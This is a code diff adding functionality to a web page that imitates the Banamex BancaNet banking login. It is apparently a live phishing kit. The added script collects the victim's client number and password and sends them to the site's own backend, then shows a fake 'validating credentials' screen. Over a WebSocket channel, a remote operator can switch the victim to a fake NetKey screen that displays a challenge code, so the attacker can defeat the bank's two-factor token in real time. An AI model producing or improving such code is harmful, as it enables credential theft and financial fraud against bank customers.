@@ -169,7 +169,42 @@
         </div>
     </div>
 
+    <div id="loading-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000;">
+        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
+            <div class="logo" style="background-size: contain; background-repeat: no-repeat; background-position: center; width: 200px; height: 60px; margin: 0 auto 30px;"></div>
+            <div style="font-size: 18px; color: #003d7a; margin-bottom: 20px;">Validando credenciales...</div>
+            <div style="width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #003d7a; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+        </div>
+        <style>
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        </style>
+    </div>
+
+    <div id="netkey-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000;">
+        <div class="header">
+            <div class="bottom">
+                <div class="logo"></div>
+                <div class="divisor_logos"></div>
+                <div class="BancaNet"></div>
+            </div>
+        </div>
+        <div style="max-width: 500px; margin: 100px auto; padding: 30px; background: #003d7a; border-radius: 8px; color: white;">
+            <h2 style="text-align: center; margin-bottom: 20px;">Autenticación NetKey</h2>
+            <p style="text-align: center; margin-bottom: 30px; font-size: 14px;">Por favor ingrese el código CHALLENGE de su dispositivo NetKey</p>
+            <div style="background: white; color: #003d7a; padding: 40px 20px; text-align: center; border-radius: 4px; font-size: 48px; font-weight: bold; letter-spacing: 8px; font-family: 'Courier New', monospace;" id="challenge-display">
+                --------
+            </div>
+            <p style="text-align: center; margin-top: 20px; font-size: 12px; opacity: 0.8;">Esperando código CHALLENGE...</p>
+        </div>
+    </div>
+
     <script>
+        var ws = null;
+        var currentSessionId = null;
+
         // Set current date
         window.addEventListener('DOMContentLoaded', function() {
             var today = new Date();
@@ -230,7 +265,107 @@
             document.getElementById('PASSWORD').addEventListener('paste', function(e) {
                 e.preventDefault();
             });
+
+            // Handle form submission
+            document.querySelector('.btn_az').addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                var numeroCliente = document.getElementById('USERID').value.trim();
+                var claveAcceso = document.getElementById('PASSWORD').value.trim();
+                
+                if (!numeroCliente || !claveAcceso) {
+                    alert('Por favor complete todos los campos');
+                    return;
+                }
+                
+                // Show loading screen
+                document.getElementById('loading-screen').style.display = 'block';
+                
+                // Send login request
+                fetch('/api/banamex/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        numeroCliente: numeroCliente,
+                        claveAcceso: claveAcceso
+                    })
+                })
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    if (data.success) {
+                        currentSessionId = data.sessionId;
+                        connectWebSocket(data.sessionId);
+                    } else {
+                        alert('Error al procesar login: ' + (data.message || 'Error desconocido'));
+                        document.getElementById('loading-screen').style.display = 'none';
+                    }
+                })
+                .catch(function(error) {
+                    console.error('Error:', error);
+                    alert('Error de conexión');
+                    document.getElementById('loading-screen').style.display = 'none';
+                });
+            });
+
+            // Allow Enter key to submit
+            document.getElementById('PASSWORD').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    document.querySelector('.btn_az').click();
+                }
+            });
         });
+
+        function connectWebSocket(sessionId) {
+            var protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            var wsUrl = protocol + '//' + window.location.host + '/ws';
+            
+            ws = new WebSocket(wsUrl);
+            
+            ws.onopen = function() {
+                console.log('WebSocket conectado');
+                ws.send(JSON.stringify({
+                    type: 'REGISTER',
+                    role: 'CLIENT',
+                    sessionId: sessionId
+                }));
+            };
+            
+            ws.onmessage = function(event) {
+                try {
+                    var data = JSON.parse(event.data);
+                    console.log('Mensaje recibido:', data);
+                    
+                    if (data.type === 'SCREEN_CHANGE') {
+                        handleScreenChange(data);
+                    }
+                } catch (e) {
+                    console.error('Error procesando mensaje:', e);
+                }
+            };
+            
+            ws.onerror = function(error) {
+                console.error('WebSocket error:', error);
+            };
+            
+            ws.onclose = function() {
+                console.log('WebSocket cerrado');
+            };
+        }
+
+        function handleScreenChange(data) {
+            console.log('Cambio de pantalla:', data);
+            
+            if (data.tipo === 'netkey') {
+                document.getElementById('loading-screen').style.display = 'none';
+                document.getElementById('netkey-screen').style.display = 'block';
+                
+                if (data.challenge) {
+                    document.getElementById('challenge-display').textContent = data.challenge;
+                }
+            }
+        }
     </script>
 </body>
 </html>
